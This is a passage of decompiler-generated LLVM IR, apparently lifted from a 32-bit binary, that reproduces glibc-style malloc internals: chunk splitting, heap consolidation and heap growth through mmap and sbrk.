  %v0_80504e512 = phi i32 [ %v1_80504dd, %dec_label_pc_80504d3 ], [ %v0_80504e512.pre, %dec_label_pc_80504ba.dec_label_pc_80504ea.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_80504d3 ], [ %v0_80504ba, %dec_label_pc_80504ba.dec_label_pc_80504ea.preheader_crit_edge ]
  %v0_80504fb = phi i32 [ %v4_80504c8, %dec_label_pc_80504d3 ], [ %v1_80504b6, %dec_label_pc_80504ba.dec_label_pc_80504ea.preheader_crit_edge ]
  %v2_80504ea4 = and i32 %v0_80504fb, %esi.promoted
  %v3_80504ea5 = icmp eq i32 %v2_80504ea4, 0
  br i1 %v3_80504ea5, label %dec_label_pc_80504e5, label %dec_label_pc_80504ee

dec_label_pc_80504e5:                             ; preds = %dec_label_pc_80504ea.preheader, %dec_label_pc_80504e5
  %v2_80504e814 = phi i32 [ %v2_80504e8, %dec_label_pc_80504e5 ], [ %esi.promoted, %dec_label_pc_80504ea.preheader ]
  %v0_80504e513 = phi i32 [ %v1_80504e5, %dec_label_pc_80504e5 ], [ %v0_80504e512, %dec_label_pc_80504ea.preheader ]
  %v1_80504e5 = add i32 %v0_80504e513, 8
  %v2_80504e8 = mul i32 %v2_80504e814, 2
  %v2_80504ea = and i32 %v2_80504e8, %v0_80504fb
  %v3_80504ea = icmp eq i32 %v2_80504ea, 0
  br i1 %v3_80504ea, label %dec_label_pc_80504e5, label %dec_label_pc_80504ea.dec_label_pc_80504ee_crit_edge

dec_label_pc_80504ea.dec_label_pc_80504ee_crit_edge: ; preds = %dec_label_pc_80504e5
  store i32 %v1_80504e5, i32* %ebx.global-to-local, align 4
  store i32 %v2_80504e8, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80504ee

dec_label_pc_80504ee:                             ; preds = %dec_label_pc_80504ea.dec_label_pc_80504ee_crit_edge, %dec_label_pc_80504ea.preheader
  %v0_80504f5 = phi i32 [ %v2_80504e8, %dec_label_pc_80504ea.dec_label_pc_80504ee_crit_edge ], [ %esi.promoted, %dec_label_pc_80504ea.preheader ]
  %v1_8050518 = phi i32 [ %v1_80504e5, %dec_label_pc_80504ea.dec_label_pc_80504ee_crit_edge ], [ %v0_80504e512, %dec_label_pc_80504ea.preheader ]
  %v1_80504ee = add i32 %v1_8050518, 12
  %v2_80504ee = inttoptr i32 %v1_80504ee to i32*
  %v3_80504ee = load i32, i32* %v2_80504ee, align 4
  store i32 %v3_80504ee, i32* @ecx, align 4
  %v12_80504f1 = icmp eq i32 %v3_80504ee, %v1_8050518
  %v1_80504f3 = icmp eq i1 %v12_80504f1, false
  br i1 %v1_80504f3, label %dec_label_pc_8050509, label %dec_label_pc_80504f5

dec_label_pc_80504f5:                             ; preds = %dec_label_pc_80504ee
  %v2_80504f7 = mul i32 %v0_80504f5, 2
  store i32 %v2_80504f7, i32* %esi.global-to-local, align 4
  %v1_80504f9 = sub i32 -1, %v0_80504f5
  store i32 %v1_80504f9, i32* %eax.global-to-local, align 4
  %v2_80504fb = and i32 %v0_80504fb, %v1_80504f9
  store i32 %v2_80504fb, i32* %edx.global-to-local, align 4
  %v1_80504fd = add i32 %v3_80504ee, 8
  store i32 %v1_80504fd, i32* %ebx.global-to-local, align 4
  %v1_8050500 = load i32, i32* @edi, align 4
  %v2_8050500 = mul i32 %v1_8050500, 4
  %v3_8050500 = add i32 %v2_8050500, ptrtoint (i32* @global_var_8060d34.193 to i32)
  %v4_8050500 = inttoptr i32 %v3_8050500 to i32*
  store i32 %v2_80504fb, i32* %v4_8050500, align 4
  %v0_80504b6.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_80504b6.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8050509:                             ; preds = %dec_label_pc_80504ee
  %v1_8050509 = add i32 %v3_80504ee, 4
  %v2_8050509 = inttoptr i32 %v1_8050509 to i32*
  %v3_8050509 = load i32, i32* %v2_8050509, align 4
  store i32 %v3_8050509, i32* %edx.global-to-local, align 4
  %v1_805050c = add i32 %v3_80504ee, 12
  %v2_805050c = inttoptr i32 %v1_805050c to i32*
  %v3_805050c = load i32, i32* %v2_805050c, align 4
  store i32 %v3_805050c, i32* %eax.global-to-local, align 4
  %v1_805050f = and i32 %v3_8050509, -4
  store i32 %v1_805050f, i32* @edx, align 4
  %v5_8050514 = sub i32 %v1_805050f, %v1_805060e
  store i32 %v5_8050514, i32* %esi.global-to-local, align 4
  store i32 %v3_805050c, i32* %v2_80504ee, align 4
  %v0_805051b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805051b = load i32, i32* %eax.global-to-local, align 4
  %v2_805051b = add i32 %v1_805051b, 8
  %v3_805051b = inttoptr i32 %v2_805051b to i32*
  store i32 %v0_805051b, i32* %v3_805051b, align 4
  %v0_805051e = load i32, i32* %esi.global-to-local, align 4
  %tmp138 = icmp ult i32 %v0_805051e, 16
  %v0_8050523 = load i32, i32* @ecx, align 4
  br i1 %tmp138, label %dec_label_pc_8050523, label %dec_label_pc_805052a

dec_label_pc_8050523:                             ; preds = %dec_label_pc_8050509
  %v1_8050523 = load i32, i32* @edx, align 4
  %v2_8050523 = add i32 %v0_8050523, 4
  %v3_8050523 = add i32 %v2_8050523, %v1_8050523
  %v4_8050523 = inttoptr i32 %v3_8050523 to i32*
  %v5_8050523 = load i32, i32* %v4_8050523, align 4
  %v6_8050523 = or i32 %v5_8050523, 1
  store i32 %v6_8050523, i32* %v4_8050523, align 4
  br label %dec_label_pc_8050571

dec_label_pc_805052a:                             ; preds = %dec_label_pc_8050509
  %v2_805052e = add i32 %v0_8050523, %v1_805060e
  store i32 %v2_805052e, i32* %eax.global-to-local, align 4
  %v1_8050537 = load i32, i32* @ebp, align 4
  %v2_8050537 = add i32 %v1_8050537, 8
  %v3_8050537 = inttoptr i32 %v2_8050537 to i32*
  store i32 %v2_805052e, i32* %v3_8050537, align 4
  %v0_805053a = load i32, i32* %eax.global-to-local, align 4
  %v1_805053a = load i32, i32* @ebp, align 4
  %v2_805053a = add i32 %v1_805053a, 12
  %v3_805053a = inttoptr i32 %v2_805053a to i32*
  store i32 %v0_805053a, i32* %v3_805053a, align 4
  %v0_805053d = load i32, i32* %eax.global-to-local, align 4
  %v1_805053d = add i32 %v0_805053d, 8
  %v2_805053d = inttoptr i32 %v1_805053d to i32*
  store i32 ptrtoint (i32* @global_var_8060a34.191 to i32), i32* %v2_805053d, align 4
  %v0_8050544 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050544 = add i32 %v0_8050544, 12
  %v2_8050544 = inttoptr i32 %v1_8050544 to i32*
  store i32 ptrtoint (i32* @global_var_8060a34.191 to i32), i32* %v2_8050544, align 4
  %v0_805054b = load i32, i32* @global_var_8060a30.190, align 16
  %v4_8050551 = load i32, i32* %eax.global-to-local, align 4
  %v5_8050551 = select i1 %v8_80502b7, i32 %v4_8050551, i32 %v0_805054b
  %v4_8050554 = or i32 %v1_805060e, 1
  store i32 %v5_8050551, i32* @global_var_8060a30.190, align 16
  %v0_805055f = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8050554, i32* %ebx.global-to-local, align 4
  %v1_8050565 = or i32 %v0_805055f, 1
  store i32 %v1_8050565, i32* @edx, align 4
  %v3_8050568 = add i32 %v0_805055f, %v4_8050551
  %v4_8050568 = inttoptr i32 %v3_8050568 to i32*
  store i32 %v0_805055f, i32* %v4_8050568, align 4
  %v0_805056b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805056b = load i32, i32* @ecx, align 4
  %v2_805056b = add i32 %v1_805056b, 4
  %v3_805056b = inttoptr i32 %v2_805056b to i32*
  store i32 %v0_805056b, i32* %v3_805056b, align 4
  %v0_805056e = load i32, i32* @edx, align 4
  %v1_805056e = load i32, i32* %eax.global-to-local, align 4
  %v2_805056e = add i32 %v1_805056e, 4
  %v3_805056e = inttoptr i32 %v2_805056e to i32*
  store i32 %v0_805056e, i32* %v3_805056e, align 4
  br label %dec_label_pc_8050571

dec_label_pc_8050571:                             ; preds = %dec_label_pc_8050665, %dec_label_pc_8050523, %dec_label_pc_805052a
  %v0_8050571 = load i32, i32* @ecx, align 4
  %v1_8050571 = add i32 %v0_8050571, 8
  store i32 %v1_8050571, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050999

dec_label_pc_8050579.loopexit:                    ; preds = %dec_label_pc_80504be
  br label %dec_label_pc_8050579

dec_label_pc_8050579:                             ; preds = %dec_label_pc_8050579.loopexit, %dec_label_pc_8050279, %dec_label_pc_8050281
  %v0_8050579 = load i32, i32* @global_var_8060a2c.189, align 4
  store i32 %v0_8050579, i32* @ebx, align 4
  store i32 %v1_805060e, i32* %esi.global-to-local, align 4
  %v1_8050583 = add i32 %v0_8050579, 4
  %v2_8050583 = inttoptr i32 %v1_8050583 to i32*
  %v3_8050583 = load i32, i32* %v2_8050583, align 4
  %v1_8050586 = add i32 %v1_805060e, 16
  store i32 %v1_8050586, i32* @esi, align 4
  %v1_805058d = and i32 %v3_8050583, -4
  store i32 %v1_805058d, i32* %ecx.global-to-local, align 4
  %v7_8050590 = icmp ult i32 %v1_805058d, %v1_8050586
  br i1 %v7_8050590, label %dec_label_pc_80505b0, label %dec_label_pc_8050594

dec_label_pc_8050594:                             ; preds = %dec_label_pc_8050579
  %v2_8050598 = add i32 %v0_8050579, %v1_805060e
  store i32 %v2_8050598, i32* @edx, align 4
  %v1_805059b = or i32 %v1_805060e, 1
  store i32 %v1_805059b, i32* %eax.global-to-local, align 4
  store i32 %v2_8050598, i32* @global_var_8060a2c.189, align 4
  store i32 %v1_805059b, i32* %v2_8050583, align 4
  %v0_80505a7 = load i32, i32* %ecx.global-to-local, align 4
  %v5_80505a7 = sub i32 %v0_80505a7, %v1_805060e
  store i32 %v5_80505a7, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050929

dec_label_pc_80505b0:                             ; preds = %dec_label_pc_8050579
  %v0_80505b0 = load i8, i8* @global_var_8060a00.188, align 512
  %v1_80505b0 = and i8 %v0_80505b0, 2
  %v2_80505b0 = icmp eq i8 %v1_80505b0, 0
  %v0_80505b7 = load i32, i32* @global_var_8060d5c.194, align 4
  store i32 %v0_80505b7, i32* %edx.global-to-local, align 4
  br i1 %v2_80505b0, label %dec_label_pc_80505e4, label %dec_label_pc_80505bf

dec_label_pc_80505bf:                             ; preds = %dec_label_pc_80505b0
  store i32 ptrtoint (i8* @global_var_8060a00.188 to i32), i32* %stack_var_-92, align 4
  %v2_80505c7 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8060a00.188 to i32*))
  store i32 ptrtoint (i8* @global_var_8060a00.188 to i32), i32* @ebx, align 4
  %v1_80505d1 = add i32 %v1_805060e, -7
  store i32 %v1_80505d1, i32* %eax.global-to-local, align 4
  store i32 %v1_80505d1, i32* %stack_var_-92, align 4
  %v1_80505d5 = call i32 @malloc(i32 %v1_80505d1)
  store i32 %v1_80505d5, i32* %eax.global-to-local, align 4
  store i32 %v1_80505d5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050999

dec_label_pc_80505e4:                             ; preds = %dec_label_pc_80505b0
  store i32 %v1_805060e, i32* @ebx, align 4
  %v1_80505e8 = add i32 %v0_80505b7, -1
  store i32 %v1_80505e8, i32* @ecx, align 4
  %v1_80505eb = load i32, i32* @global_var_8060d4c.195, align 4
  %v7_80505eb = icmp ult i32 %v1_805060e, %v1_80505eb
  br i1 %v7_80505eb, label %dec_label_pc_80506c6, label %dec_label_pc_80505fb

dec_label_pc_80505fb:                             ; preds = %dec_label_pc_80505e4
  %v0_80505fb = load i32, i32* @global_var_8060d50.196, align 16
  store i32 %v0_80505fb, i32* %eax.global-to-local, align 4
  %v1_8050600 = load i32, i32* @global_var_8060d54.197, align 4
  %v5_8050606 = icmp slt i32 %v0_80505fb, %v1_8050600
  br i1 %v5_8050606, label %dec_label_pc_805060c, label %dec_label_pc_80506c6

dec_label_pc_805060c:                             ; preds = %dec_label_pc_80505fb
  %v2_805060e = add i32 %v1_805060e, 10
  %v3_805060e = add i32 %v2_805060e, %v0_80505b7
  %v1_8050612 = sub i32 0, %v0_80505b7
  store i32 %v1_8050612, i32* %eax.global-to-local, align 4
  %v2_8050614 = and i32 %v3_805060e, %v1_8050612
  store i32 %v2_8050614, i32* @ebx, align 4
  %tmp139 = icmp ugt i32 %v2_8050614, %v1_805060e
  br i1 %tmp139, label %dec_label_pc_8050620, label %dec_label_pc_80506c6

dec_label_pc_8050620:                             ; preds = %dec_label_pc_805060c
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805062d = call i32 @mmap(i32 0, i32 %v2_8050614, i32 3, i32 34, i32 0, i32 0, i32 %v1_80505e8, i32 %v1_80505e8)
  store i32 %v8_805062d, i32* %eax.global-to-local, align 4
  %v10_8050635 = icmp eq i32 %v8_805062d, -1
  store i32 %v8_805062d, i32* %edx.global-to-local, align 4
  br i1 %v10_8050635, label %dec_label_pc_8050620.dec_label_pc_80506c6_crit_edge, label %dec_label_pc_8050640

dec_label_pc_8050620.dec_label_pc_80506c6_crit_edge: ; preds = %dec_label_pc_8050620
  %v0_80506c6.pre = load i32, i32* @global_var_8060a2c.189, align 4
  br label %dec_label_pc_80506c6

dec_label_pc_8050640:                             ; preds = %dec_label_pc_8050620
  %v1_8050642 = urem i32 %v8_805062d, 8
  %v2_8050642 = icmp eq i32 %v1_8050642, 0
  store i32 %v1_8050642, i32* %ecx.global-to-local, align 4
  br i1 %v2_8050642, label %dec_label_pc_805065b, label %dec_label_pc_8050647

dec_label_pc_8050647:                             ; preds = %dec_label_pc_8050640
  %v0_805064c = load i32, i32* @ebx, align 4
  %v2_805064e = sub nsw i32 8, %v1_8050642
  store i32 %v2_805064e, i32* %eax.global-to-local, align 4
  %v2_8050650 = add i32 %v2_805064e, %v8_805062d
  store i32 %v2_8050650, i32* @ecx, align 4
  %v2_8050653 = sub i32 %v0_805064c, %v2_805064e
  store i32 %v2_8050653, i32* %esi.global-to-local, align 4
  %v2_8050655 = inttoptr i32 %v2_8050650 to i32*
  store i32 %v2_805064e, i32* %v2_8050655, align 4
  br label %dec_label_pc_8050665

dec_label_pc_805065b:                             ; preds = %dec_label_pc_8050640
  store i32 %v8_805062d, i32* @ecx, align 4
  %v1_805065d = inttoptr i32 %v8_805062d to i32*
  store i32 0, i32* %v1_805065d, align 4
  br label %dec_label_pc_8050665

dec_label_pc_8050665:                             ; preds = %dec_label_pc_8050647, %dec_label_pc_805065b
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8050647 ], [ @ebx, %dec_label_pc_805065b ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8050665 = or i32 %storemerge, 2
  %v1_8050668 = load i32, i32* @ecx, align 4
  %v2_8050668 = add i32 %v1_8050668, 4
  %v3_8050668 = inttoptr i32 %v2_8050668 to i32*
  store i32 %v1_8050665, i32* %v3_8050668, align 4
  %v0_805066b = load i32, i32* @global_var_8060d50.196, align 16
  %v0_8050670 = load i32, i32* @global_var_8060d70.198, align 16
  %v1_8050676 = add i32 %v0_805066b, 1
  %v1_8050677 = load i32, i32* @global_var_8060d58.199, align 8
  %v2_8050677 = sub i32 %v1_8050676, %v1_8050677
  %v8_8050677 = xor i32 %v1_8050677, %v1_8050676
  %v9_8050677 = xor i32 %v2_8050677, %v1_8050676
  %v10_8050677 = and i32 %v9_8050677, %v8_8050677
  %v11_8050677 = icmp slt i32 %v10_8050677, 0
  %v12_8050677 = icmp eq i32 %v2_8050677, 0
  %v13_8050677 = icmp slt i32 %v2_8050677, 0
  store i32 %v1_8050676, i32* @global_var_8060d50.196, align 16
  %v3_8050682 = icmp ne i1 %v13_8050677, %v11_8050677
  %v4_8050682 = or i1 %v12_8050677, %v3_8050682
  %v7_8050682 = select i1 %v4_8050682, i32 %v1_8050677, i32 %v1_8050676
  store i32 %v7_8050682, i32* @global_var_8060d58.199, align 8
  %v0_805068e = load i32, i32* @global_var_8060d64.200, align 4
  %v1_8050693 = load i32, i32* @ebx, align 4
  %v2_8050693 = add i32 %v1_8050693, %v0_805068e
  store i32 %v2_8050693, i32* @global_var_8060d64.200, align 4
  %tmp86 = icmp ule i32 %v2_8050693, %v0_8050670
  %v5_80506a0 = select i1 %tmp86, i32 %v0_8050670, i32 %v2_8050693
  store i32 %v5_80506a0, i32* @edx, align 4
  %v1_80506a3 = load i32, i32* @global_var_8060d68.201, align 8
  %v2_80506a3 = add i32 %v1_80506a3, %v2_8050693
  store i32 %v5_80506a0, i32* @global_var_8060d70.198, align 16
  %v1_80506af = load i32, i32* @global_var_8060d74.202, align 4
  %tmp140 = icmp ule i32 %v2_80506a3, %v1_80506af
  %v5_80506b5 = select i1 %tmp140, i32 %v1_80506af, i32 %v2_80506a3
  store i32 %v5_80506b5, i32* %eax.global-to-local, align 4
  store i32 %v5_80506b5, i32* @global_var_8060d74.202, align 4
  br label %dec_label_pc_8050571

dec_label_pc_80506c6:                             ; preds = %dec_label_pc_805060c, %dec_label_pc_8050620.dec_label_pc_80506c6_crit_edge, %dec_label_pc_80505fb, %dec_label_pc_80505e4
  %v0_80506c6 = phi i32 [ %v0_80506c6.pre, %dec_label_pc_8050620.dec_label_pc_80506c6_crit_edge ], [ %v0_8050579, %dec_label_pc_80505fb ], [ %v0_8050579, %dec_label_pc_805060c ], [ %v0_8050579, %dec_label_pc_80505e4 ]
  store i32 %v0_80506c6, i32* %eax.global-to-local, align 4
  %v1_80506cf = add i32 %v0_80506c6, 4
  %v2_80506cf = inttoptr i32 %v1_80506cf to i32*
  %v3_80506cf = load i32, i32* %v2_80506cf, align 4
  %v1_80506d6 = and i32 %v3_80506cf, -4
  %v2_80506d6 = icmp eq i32 %v1_80506d6, 0
  store i32 %v1_80506d6, i32* @ebp, align 4
  %v1_80506dc = load i32, i32* @global_var_8060d48.203, align 8
  %v0_80506e6 = load i8, i8* @global_var_8060d60.204, align 32
  %v1_80506e6 = urem i8 %v0_80506e6, 2
  %v2_80506e6 = icmp eq i8 %v1_80506e6, 0
  %v1_80506ed = icmp eq i1 %v2_80506e6, false
  %v1_80506d6.op = sub i32 0, %v1_80506d6
  %v2_80506e4.neg = select i1 %v1_80506ed, i32 %v1_80506d6.op, i32 0
  %v2_80506dc = add i32 %v1_80505e8, %v1_8050586
  %v4_80506ed = add i32 %v2_80506dc, %v1_80506dc
  %v5_80506f4 = add i32 %v4_80506ed, %v2_80506e4.neg
  store i32 %v5_80506f4, i32* %eax.global-to-local, align 4
  %v1_80506f8 = sub i32 0, %v0_80505b7
  store i32 %v1_80506f8, i32* @edx, align 4
  %v2_80506fc = and i32 %v5_80506f4, %v1_80506f8
  store i32 %v2_80506fc, i32* @esi, align 4
  %tmp87 = icmp slt i32 %v2_80506fc, 1
  br i1 %tmp87, label %dec_label_pc_805071a, label %dec_label_pc_8050704

dec_label_pc_8050704:                             ; preds = %dec_label_pc_80506c6
  store i32 %v2_80506fc, i32* %stack_var_-92, align 4
  %v1_8050708 = call i32 @__GI_sbrk(i32 %v2_80506fc)
  store i32 %v1_8050708, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v10_8050713 = icmp eq i32 %v1_8050708, -1
  store i32 %v1_8050708, i32* @ebx, align 4
  %v1_8050718 = icmp eq i1 %v10_8050713, false
  br i1 %v1_8050718, label %dec_label_pc_8050771, label %dec_label_pc_8050704.dec_label_pc_805071a_crit_edge

dec_label_pc_8050704.dec_label_pc_805071a_crit_edge: ; preds = %dec_label_pc_8050704
  %v0_805071a.pre = load i8, i8* @global_var_8060d60.204, align 32
  br label %dec_label_pc_805071a

dec_label_pc_805071a:                             ; preds = %dec_label_pc_8050704.dec_label_pc_805071a_crit_edge, %dec_label_pc_80506c6
  %v0_8050747 = phi i32 [ -1, %dec_label_pc_8050704.dec_label_pc_805071a_crit_edge ], [ %v1_80506f8, %dec_label_pc_80506c6 ]
  %v0_805071a = phi i8 [ %v0_805071a.pre, %dec_label_pc_8050704.dec_label_pc_805071a_crit_edge ], [ %v0_80506e6, %dec_label_pc_80506c6 ]
  %v1_805071a = urem i8 %v0_805071a, 2
  %v2_805071a = icmp eq i8 %v1_805071a, 0
  br i1 %v2_805071a, label %dec_label_pc_805071a.dec_label_pc_805072f_crit_edge, label %dec_label_pc_8050723

dec_label_pc_805071a.dec_label_pc_805072f_crit_edge: ; preds = %dec_label_pc_805071a
  %v0_805072f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805072f

dec_label_pc_8050723:                             ; preds = %dec_label_pc_805071a
  %v2_8050727 = add i32 %v1_80506d6, %v1_80505e8
  store i32 %v2_8050727, i32* %eax.global-to-local, align 4
  %v0_8050729 = load i32, i32* @esi, align 4
  %v2_8050729 = add i32 %v0_8050729, %v2_8050727
  %v5_805072b = and i32 %v2_8050729, %v1_80506f8
  store i32 %v5_805072b, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805072f

dec_label_pc_805072f:                             ; preds = %dec_label_pc_805071a.dec_label_pc_805072f_crit_edge, %dec_label_pc_8050723
  %v3_805073a = phi i32 [ %v0_805072f.pre, %dec_label_pc_805071a.dec_label_pc_805072f_crit_edge ], [ %v5_805072b, %dec_label_pc_8050723 ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_805073a, 1048576
  %v5_805073a = select i1 %tmp88, i32 1048576, i32 %v3_805073a
  store i32 %v5_805073a, i32* @esi, align 4
  %tmp141 = icmp ugt i32 %v5_805073a, %v1_805060e
  br i1 %tmp141, label %dec_label_pc_8050747, label %dec_label_pc_805098c

dec_label_pc_8050747:                             ; preds = %dec_label_pc_805072f
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8050754 = call i32 @mmap(i32 0, i32 %v5_805073a, i32 3, i32 34, i32 0, i32 0, i32 %v0_8050747, i32 %v0_8050747)
  store i32 %v8_8050754, i32* %eax.global-to-local, align 4
  %v10_805075c = icmp eq i32 %v8_8050754, -1
  store i32 %v8_8050754, i32* @ebx, align 4
  br i1 %v10_805075c, label %dec_label_pc_805098c, label %dec_label_pc_8050767

dec_label_pc_8050767:                             ; preds = %dec_label_pc_8050747
  %v0_8050767 = load i8, i8* @global_var_8060d60.204, align 1
  %v2_8050767 = and i8 %v0_8050767, -2
  store i8 %v2_8050767, i8* @global_var_8060d60.204, align 32
  %v1_805076e = load i32, i32* @esi, align 4
  %v2_805076e = add i32 %v1_805076e, %v8_8050754
  store i32 %v2_805076e, i32* @edx, align 4
  br label %dec_label_pc_8050771

dec_label_pc_8050771:                             ; preds = %dec_label_pc_8050704, %dec_label_pc_8050767
  %v0_8050838 = phi i32 [ -1, %dec_label_pc_8050704 ], [ %v2_805076e, %dec_label_pc_8050767 ]
  %v0_8050846 = phi i32 [ %v1_8050708, %dec_label_pc_8050704 ], [ %v8_8050754, %dec_label_pc_8050767 ]
  %v10_8050771 = icmp eq i32 %v0_8050846, -1
  br i1 %v10_8050771, label %dec_label_pc_805098c, label %dec_label_pc_805077a

dec_label_pc_805077a:                             ; preds = %dec_label_pc_8050771
  %v0_805077e = load i32, i32* @global_var_8060d68.201, align 8
  %v1_805077e = load i32, i32* @esi, align 4
  %v2_805077e = add i32 %v1_805077e, %v0_805077e
  store i32 %v2_805077e, i32* @global_var_8060d68.201, align 8
  %v2_8050784 = add i32 %v1_80506d6, %v0_80506c6
  store i32 %v2_8050784, i32* %ecx.global-to-local, align 4
  %v2_8050786 = sub i32 %v0_8050846, %v2_8050784
  %v7_8050786 = icmp ult i32 %v0_8050846, %v2_8050784
  %v12_8050786 = icmp eq i32 %v2_8050786, 0
  %v1_8050788 = icmp eq i1 %v12_8050786, false
  br i1 %v1_8050788, label %dec_label_pc_80507a1, label %dec_label_pc_805078a

dec_label_pc_805078a:                             ; preds = %dec_label_pc_805077a
  %v10_805078a = icmp eq i32 %v0_8050838, -1
  %v1_805078d = icmp eq i1 %v10_805078a, false
  br i1 %v1_805078d, label %dec_label_pc_80507a1, label %dec_label_pc_805078f

dec_label_pc_805078f:                             ; preds = %dec_label_pc_805078a
  store i32 %v0_80506c6, i32* %ecx.global-to-local, align 4
  %v2_8050793 = add i32 %v1_805077e, %v1_80506d6
  %v1_8050796 = or i32 %v2_8050793, 1
  store i32 %v1_8050796, i32* %eax.global-to-local, align 4
  store i32 %v1_8050796, i32* %v2_80506cf, align 4
  br label %dec_label_pc_80508ce

dec_label_pc_80507a1:                             ; preds = %dec_label_pc_805078a, %dec_label_pc_805077a
  %v0_80507a1 = load i8, i8* @global_var_8060d60.204, align 1
  %v1_80507a1 = sext i8 %v0_80507a1 to i32
  store i32 %v1_80507a1, i32* %eax.global-to-local, align 4
  %v2_80507a6 = urem i8 %v0_80507a1, 2
  %v3_80507a6 = icmp eq i8 %v2_80507a6, 0
  br i1 %v3_80507a6, label %dec_label_pc_80507ba, label %dec_label_pc_80507aa

dec_label_pc_80507aa:                             ; preds = %dec_label_pc_80507a1
  br i1 %v2_80506d6, label %dec_label_pc_80507ba, label %dec_label_pc_80507ae

dec_label_pc_80507ae:                             ; preds = %dec_label_pc_80507aa
  %v1_80507b0 = icmp eq i1 %v7_8050786, false
  br i1 %v1_80507b0, label %dec_label_pc_80507ba, label %dec_label_pc_80507b2

dec_label_pc_80507b2:                             ; preds = %dec_label_pc_80507ae
  %v1_80507b2 = and i32 %v1_80507a1, -2
  %v4_80507b2 = trunc i32 %v1_80507b2 to i8
  store i32 %v1_80507b2, i32* %eax.global-to-local, align 4
  store i8 %v4_80507b2, i8* @global_var_8060d60.204, align 32
  br label %dec_label_pc_80507ba

dec_label_pc_80507ba:                             ; preds = %dec_label_pc_80507ae, %dec_label_pc_80507aa, %dec_label_pc_80507a1, %dec_label_pc_80507b2
  %v0_80507ba = phi i8 [ %v0_80507a1, %dec_label_pc_80507ae ], [ %v0_80507a1, %dec_label_pc_80507aa ], [ %v0_80507a1, %dec_label_pc_80507a1 ], [ %v4_80507b2, %dec_label_pc_80507b2 ]
  %v1_80507ba = urem i8 %v0_80507ba, 2
  %v2_80507ba = icmp eq i8 %v1_80507ba, 0
  br i1 %v2_80507ba, label %dec_label_pc_8050838, label %dec_label_pc_80507c3

dec_label_pc_80507c3:                             ; preds = %dec_label_pc_80507ba
  br i1 %v2_80506d6, label %dec_label_pc_80507d1, label %dec_label_pc_80507c7

dec_label_pc_80507c7:                             ; preds = %dec_label_pc_80507c3
  store i32 %v2_8050786, i32* %eax.global-to-local, align 4
  %v2_80507cb = add i32 %v2_805077e, %v2_8050786
  store i32 %v2_80507cb, i32* @global_var_8060d68.201, align 8
  br label %dec_label_pc_80507d1

dec_label_pc_80507d1:                             ; preds = %dec_label_pc_80507c3, %dec_label_pc_80507c7
  %v1_80507d3 = urem i32 %v0_8050846, 8
  %v2_80507d3 = icmp eq i32 %v1_80507d3, 0
  store i32 %v1_80507d3, i32* %edx.global-to-local, align 4
  %v1_80507d6 = icmp eq i1 %v2_80507d3, false
  br i1 %v1_80507d6, label %dec_label_pc_80507de, label %dec_label_pc_80507d8

dec_label_pc_80507d8:                             ; preds = %dec_label_pc_80507d1
  store i32 %v0_8050846, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80507e8

dec_label_pc_80507de:                             ; preds = %dec_label_pc_80507d1
  %v2_80507e3 = sub nsw i32 8, %v1_80507d3
  store i32 %v2_80507e3, i32* %eax.global-to-local, align 4
  %v2_80507e5 = add i32 %v2_80507e3, %v0_8050846
  store i32 %v2_80507e5, i32* @edi, align 4
  br label %dec_label_pc_80507e8

dec_label_pc_80507e8:                             ; preds = %dec_label_pc_80507d8, %dec_label_pc_80507de
  %v0_80507f5 = phi i32 [ 0, %dec_label_pc_80507d8 ], [ %v2_80507e3, %dec_label_pc_80507de ]
  %v2_80507e8 = add i32 %v1_805077e, %v0_8050846
  %v2_80507f5 = add i32 %v0_80507f5, %v1_80506d6
  store i32 %v2_80507f5, i32* %ecx.global-to-local, align 4
  %v2_80507f8 = add i32 %v2_80507f5, %v2_80507e8
  store i32 %v2_80507f8, i32* %edx.global-to-local, align 4
  %v2_80507fa = add i32 %v2_80507f8, %v1_80505e8
  %v5_80507fd = and i32 %v2_80507fa, %v1_80506f8
  %v2_8050804 = sub i32 %v5_80507fd, %v2_80507f8
  store i32 %v2_8050804, i32* %eax.global-to-local, align 4
  %v2_8050806 = add i32 %v2_8050804, %v2_80507f5
  store i32 %v2_8050806, i32* @esi, align 4
  store i32 %v2_8050806, i32* %stack_var_-92, align 4
  %v1_805080a = call i32 @__GI_sbrk(i32 %v2_8050806)
  store i32 %v1_805080a, i32* %eax.global-to-local, align 4
  %v10_8050812 = icmp eq i32 %v1_805080a, -1
  store i32 %v1_805080a, i32* %edx.global-to-local, align 4
  %v1_8050817 = icmp eq i1 %v10_8050812, false
  br i1 %v1_8050817, label %dec_label_pc_8050827, label %dec_label_pc_8050819

dec_label_pc_8050819:                             ; preds = %dec_label_pc_80507e8
  store i32 0, i32* %stack_var_-92, align 4
  %v1_805081e = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805081e, i32* %eax.global-to-local, align 4
  store i32 %v1_805081e, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805085b

dec_label_pc_8050827:                             ; preds = %dec_label_pc_80507e8
  %v1_8050827 = load i32, i32* @ebx, align 4
  %v7_8050827 = icmp ult i32 %v1_805080a, %v1_8050827
  %v1_8050829 = icmp eq i1 %v7_8050827, false
  br i1 %v1_8050829, label %dec_label_pc_8050860, label %dec_label_pc_805082b

dec_label_pc_805082b:                             ; preds = %dec_label_pc_8050827
  %v0_805082b = load i8, i8* @global_var_8060d60.204, align 1
  %v2_805082b = and i8 %v0_805082b, -2
